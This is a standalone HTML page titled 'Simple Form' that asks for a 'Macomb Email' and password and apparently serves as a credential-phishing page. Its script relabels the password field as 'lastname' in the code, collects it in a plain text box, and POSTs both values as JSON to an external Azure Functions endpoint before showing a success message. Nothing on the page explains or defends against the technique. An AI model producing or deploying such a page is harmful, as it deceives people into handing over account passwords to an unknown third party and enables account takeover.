<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Simple Form</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 2rem;
    }
    label {
      display: block;
      margin-top: 1rem;
    }
    input {
      padding: 0.5rem;
      width: 300px;
      max-width: 100%;
    }
    button {
      margin-top: 1.5rem;
      padding: 0.6rem 1.2rem;
      font-size: 1rem;
      cursor: pointer;
    }
    #result {
      margin-top: 1rem;
      font-weight: bold;
    }
    .success {
      color: green;
    }
    .error {
      color: red;
    }
  </style>
</head>

<body>

  <h1>Submit Your Info</h1>

  <form id="form">
    <label for="email">Enter Macomb Email</label>
    <input type="email" id="email" required />

    <label for="lastname">Enter Password</label>
    <input type="text" id="lastname" required />

    <button type="submit">Submit</button>
  </form>

  <p id="result"></p>

  <script>
    const form = document.getElementById("form");
    const resultEl = document.getElementById("result");

    form.addEventListener("submit", async function (e) {
      e.preventDefault();

      resultEl.textContent = "Submitting...";
      resultEl.className = "";

      const email = document.getElementById("email").value.trim();
      const lastname = document.getElementById("lastname").value.trim();

      try {
        const response = await fetch(
          "https://webappfunction-g3enf6bnfygjfcg4.eastus2-01.azurewebsites.net/api/submit",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              email: email,
              lastname: lastname
            })
          }
        );

        const data = await response.json();

        if (response.ok && data.success) {
          resultEl.textContent = "✅ Saved successfully!";
          resultEl.className = "success";
          form.reset();
        } else {
          resultEl.textContent = data.error || "❌ Failed to save data.";
          resultEl.className = "error";
        }

      } catch (err) {
        console.error("Submit failed:", err);
        resultEl.textContent = "❌ Network or server error.";
        resultEl.className = "error";
      }
    });
  </script>

</body>
</html>
